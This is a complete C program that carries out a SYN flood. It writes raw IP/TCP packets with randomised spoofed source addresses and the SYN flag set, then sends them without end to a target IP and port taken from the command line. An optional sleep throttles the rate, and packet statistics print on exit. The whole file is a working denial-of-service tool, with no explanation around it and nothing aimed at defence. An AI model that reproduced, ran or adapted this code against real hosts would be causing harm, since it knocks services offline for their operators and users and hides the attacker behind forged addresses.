#include <stdio.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <pthread.h>
#include <errno.h>

typedef struct ip_hdr {
    unsigned char h_verlen;
    unsigned char tos;
    unsigned short total_len;
    unsigned short ident;
    unsigned short frag_and_flags;
    unsigned char ttl;
    unsigned char proto;
    unsigned short checksum;
    unsigned int sourceIP;
    unsigned int destIP;
} IP_HEADER;

typedef struct tcp_hdr {
    unsigned short th_sport;
    unsigned short th_dport;
    unsigned int th_seq;
    unsigned int th_ack;
    unsigned char th_lenres;
    unsigned char th_flag;
    unsigned short th_win;
    unsigned short th_sum;
    unsigned short th_urp;
} TCP_HEADER;

typedef struct tsd_hdr {
    unsigned long saddr;
    unsigned long daddr;
    char mbz;
    char ptcl;
    unsigned short tcpl;
} PSD_HEADER;

#define PACKET_SIZE     sizeof(IP_HEADER) + sizeof( TCP_HEADER )
char dst_ip[20] = {0};
int dst_port;
unsigned long long sleeptime, starttime, outcount = 0;
int pkt_then_sleep = 0;

unsigned short CheckSum(unsigned short * buffer, int size) {
    unsigned long cksum = 0;
    while (size > 1) {
        cksum += *buffer++;
        size -= sizeof (unsigned short);
    }
    if (size) {
        cksum += *(unsigned char *) buffer;
    }
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);
    return (unsigned short) (~cksum);
}

void MySleep(unsigned int micro_second) {
    struct timeval t_timeval;

    t_timeval.tv_sec = 0;
    t_timeval.tv_usec = micro_second;

    select(0, NULL, NULL, NULL, &t_timeval);
}

void Init(char *buffer) {
    char src_ip[20] = {0};
    int n = 0;
    IP_HEADER IpHeader;
    TCP_HEADER TcpHeader;
    PSD_HEADER PsdHeader;
    sprintf(src_ip, "%d.%d.%d.%d", rand() % 250 + 1, rand() % 250 + 1, rand() % 250 + 1, rand() % 250 + 1);
    IpHeader.h_verlen = (4 << 4 | sizeof (IpHeader) / sizeof (unsigned int));
    IpHeader.tos = 0;
    IpHeader.total_len = htons(sizeof (IpHeader) + sizeof (TcpHeader));
    IpHeader.ident = 1;
    IpHeader.frag_and_flags = 0x40;
    IpHeader.ttl = 255;
    IpHeader.proto = IPPROTO_TCP;
    IpHeader.checksum = 0;
    IpHeader.sourceIP = inet_addr(src_ip);
    IpHeader.destIP = inet_addr(dst_ip);

    TcpHeader.th_sport = htons(rand() % 9000 + 1234);
    TcpHeader.th_dport = htons(dst_port);
    TcpHeader.th_seq = htonl(rand() % 90000000 + 2345);
    TcpHeader.th_ack = 0;
    TcpHeader.th_lenres = (sizeof (TcpHeader) / 4 << 4 | 0);
    TcpHeader.th_flag = 0x02;
    TcpHeader.th_win = htons(512);
    TcpHeader.th_sum = 0;
    TcpHeader.th_urp = 0;

    PsdHeader.saddr = IpHeader.sourceIP;
    PsdHeader.daddr = IpHeader.destIP;
    PsdHeader.mbz = 0;
    PsdHeader.ptcl = IPPROTO_TCP;
    PsdHeader.tcpl = htons(sizeof (TcpHeader));

    memcpy((void*) buffer, (void*) &PsdHeader, sizeof (PsdHeader));
    memcpy((void*) (buffer + sizeof (PsdHeader)), (void*) &TcpHeader, sizeof (TcpHeader));
    TcpHeader.th_sum = CheckSum((unsigned short *) buffer, sizeof (PsdHeader) + sizeof (TcpHeader));

    memset(buffer, 0, PACKET_SIZE);
    memcpy((void*) buffer, (void*) &IpHeader, sizeof (IpHeader));
    IpHeader.checksum = CheckSum((unsigned short *) buffer, sizeof (IpHeader));

    //memcpy( (void*)buffer, (void*)&IpHeader, sizeof(IpHeader) );
    memcpy((void*) (buffer + sizeof (IpHeader)), (void*) &TcpHeader, sizeof (TcpHeader));
}

void Flood() {
    int sock;
    int flag = 1;
    char buffer[PACKET_SIZE] = {0};
    struct sockaddr_in sa;
    memset(&sa, 0, sizeof (struct sockaddr_in));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(dst_port);
    sa.sin_addr.s_addr = inet_addr(dst_ip);
    if ((sock = socket(PF_INET, SOCK_RAW, 6)) < 1) {
        printf("create socket error...%s\n", strerror(errno));
        exit(-1);
    }
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *) &flag, sizeof (flag)) < 0) {
        printf("setsockopt error...%d\n", errno);
        exit(-1);
    }
    srand((unsigned) time(NULL));
    int number = 0;
    if (sleeptime == 0) {
        while (1) {
            memset((void*) buffer, 0, PACKET_SIZE);
            Init(buffer);
            sendto(sock, buffer, PACKET_SIZE, 0, (struct sockaddr *) (&sa), sizeof (struct sockaddr_in));
            outcount++;
        }
    } else {
        while (1) {
            memset((void*) buffer, 0, PACKET_SIZE);
            Init(buffer);
            sendto(sock, buffer, PACKET_SIZE, 0, (struct sockaddr *) (&sa), sizeof (struct sockaddr_in));
            outcount++;
            number++;
            if (number == pkt_then_sleep) {
                MySleep(sleeptime);
                number = 0;
            }
        }
    }
}

void sig_proc(int signum) {
    int ctime = 0;
    printf("signal: %d\n", signum);
    ctime = time(NULL);
    printf("\n -- statistics -----------------------\n");
    printf("   packets sent:          %d\n", outcount);
    printf("   seconds active:        %d\n", ctime - starttime);
    printf("   average packet/second: %d\n", outcount / (ctime - starttime));
    printf(" -------------------------------------\n");
    exit(1);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        fprintf(stderr, "\n%s <target ip> <target port> <pkt_then_sleep> <sleep_time>\n", argv[0]);
        fprintf(stderr, "send syn packets to <target ip>:<target port>, sleep <sleep_time> microseconds per <pkt_then_sleep> paskets\n\n");
        return -1;
    }
    strncpy(dst_ip, argv[1], 16);
    dst_port = atoi(argv[2]);
    if (inet_addr(dst_ip) == INADDR_NONE) {
        printf("target ip error.\n");
        return -1;
    }
    if (dst_port < 0 || dst_port > 65535) {
        printf("port error.\n");
        return -1;
    }
    pkt_then_sleep = atoi(argv[3]);
    if (pkt_then_sleep == 0) {
        printf("pkt_then_sleep error.\n");
        return -1;
    }
    sleeptime = atoi(argv[4]);
    starttime = time(NULL);
    while (time(NULL) == starttime) usleep(1000);
    signal(SIGHUP, &sig_proc);
    signal(SIGINT, &sig_proc);
    signal(SIGQUIT, &sig_proc);
    signal(SIGILL, &sig_proc);
    signal(SIGABRT, &sig_proc);
    signal(SIGFPE, &sig_proc);
    signal(SIGSEGV, &sig_proc);
    signal(SIGPIPE, &sig_proc);
    signal(SIGALRM, &sig_proc);
    signal(SIGTERM, &sig_proc);
    signal(SIGUSR1, &sig_proc);
    signal(SIGUSR2, &sig_proc);
    signal(SIGCHLD, &sig_proc);
    signal(SIGCONT, &sig_proc);
    signal(SIGTSTP, &sig_proc);
    signal(SIGTTIN, &sig_proc);
    signal(SIGTTOU, &sig_proc);
    Flood();
    return 0;
}
